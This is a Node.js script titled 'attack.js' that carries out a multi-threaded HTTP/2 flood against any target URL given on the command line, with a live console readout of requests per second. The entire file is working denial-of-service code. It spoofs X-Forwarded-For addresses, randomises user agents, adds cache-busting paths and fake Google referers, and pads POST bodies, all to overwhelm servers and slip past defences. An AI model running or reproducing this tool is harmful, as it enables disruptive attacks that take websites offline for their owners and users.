const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const readline = require('readline');
const net = require('net');
const os = require('os');

const THREADS = os.cpus().length;
const CONNECTIONS = 50;
const MAX_INFLIGHT = 1000;
const REFRESH_RATE = 3000;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;
let end;

function randInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}
function randomPath() {
    return `/api/${Math.random().toString(36).substring(7)}?t=${Date.now()}`;
}
function randomIP() {
    return `${randInt(1, 255)}.${randInt(1, 255)}.${randInt(1, 255)}.${randInt(1, 255)}`;
}
function randomUA() {
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${randInt(500, 600)}.36 (KHTML, like Gecko) Chrome/${randInt(80, 120)}.0.${randInt(1000, 4000)}.100 Safari/${randInt(500, 600)}.36`;
}
function generatePayload() {
    return 'x='.repeat(randInt(1000, 3000));
}

if (isMainThread) {
    const [, , targetArg, durationArg] = process.argv;

    if (!targetArg || !durationArg) {
        console.error('Usage: node attack.js <https://target> <duration_secs>');
        process.exit(1);
    }

    const target = new URL(targetArg);
    end = Date.now() + parseInt(durationArg) * 1000;

    console.clear();
    console.log(`🚀 Starting HTTP/2 Flood: ${target.hostname}`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, {
            workerData: {
                target: targetArg,
                host: target.hostname,
                duration: parseInt(durationArg),
                connections: CONNECTIONS
            }
        });
    }

    // Metrics Socket
    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(9999);

    // Stats
    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        rpsLastSecond = 0;
        printStats();
    }, REFRESH_RATE);

    function printStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        const timeLeft = Math.max(0, (end - Date.now()) / 1000);
        const min = Math.floor(timeLeft / 60);
        const sec = Math.floor(timeLeft % 60);
        console.log(`🚀 HTTP/2 FLOOD [${THREADS} threads]`);
        console.log(`==============================`);
        console.log(`Total Requests : ${totalRequests}`);
        console.log(`Max RPS        : ${maxRps}`);
        console.log(`Success        : ${successCount}`);
        console.log(`Errors         : ${errorCount}`);
        console.log(`Time Remaining : ${min}:${sec < 10 ? '0' : ''}${sec}`);
    }
} else {
    const { target, host, duration, connections } = workerData;
    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);
    const endTime = Date.now() + duration * 1000;

    function flood(client) {
        const inflight = { count: 0 };

        function sendOnce() {
            if (Date.now() > endTime || inflight.count >= MAX_INFLIGHT || client.destroyed) return;

            inflight.count++;
            const isPost = Math.random() > 0.5;
            const path = randomPath();
            const headers = {
                ':method': isPost ? 'POST' : 'GET',
                ':scheme': 'https',
                ':authority': host,
                ':path': path,
                'user-agent': randomUA(),
                'x-forwarded-for': randomIP(),
                'accept': '*/*',
                'referer': 'https://google.com',
                'origin': 'https://google.com',
                'content-type': 'application/x-www-form-urlencoded'
            };

            try {
                const req = client.request(headers);

                req.setTimeout(5000);
                req.on('response', () => {
                    inflight.count--;
                    sendStat('ok');
                    req.close();
                });
                req.on('error', () => {
                    inflight.count--;
                    sendStat('err');
                });

                if (isPost) {
                    req.write(generatePayload());
                }
                req.end();
                sendStat('req');
            } catch (err) {
                inflight.count--;
                sendStat('err');
            }

            setImmediate(sendOnce);
        }

        for (let i = 0; i < connections; i++) {
            sendOnce();
        }
    }

    function startConnection() {
        if (Date.now() > endTime) return;

        try {
            const client = http2.connect(target, {
                settings: { enablePush: false }
            });

            client.on('connect', () => flood(client));
            client.on('error', () => {
                client.destroy();
                setTimeout(startConnection, 1000);
            });
            client.on('close', () => {
                setTimeout(startConnection, 1000);
            });
        } catch {
            setTimeout(startConnection, 1000);
        }
    }

    for (let i = 0; i < connections; i++) {
        startConnection();
    }
}
